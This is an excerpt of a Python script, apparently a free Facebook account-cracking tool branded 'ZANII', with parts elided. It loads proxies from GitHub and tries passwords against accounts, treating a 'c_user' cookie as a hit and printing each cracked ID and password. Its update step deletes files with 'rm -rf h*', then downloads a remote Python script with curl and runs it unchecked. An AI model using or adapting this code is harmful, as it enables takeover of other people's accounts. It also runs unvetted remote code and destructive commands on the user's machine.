...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mZANII   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.2.0
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/Mr-Azan/ZANII/main/tr.txt').text.splitlines()
    v = 5.2
    update = requests.get('https://raw.githubusercontent.com/rMr-Azan/ZANII/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf h*')
        os.system('curl -L https://raw.githubusercontent.com/Mr-Azan/AXF/main/AXF.py > AXF.py')
        os.system('python AXF.py')
    else:pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[ZANI-SUCCESSFUL] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[ZANII-CHECKPOINT] '+cid+' | '+ps+'\033[0;97m')
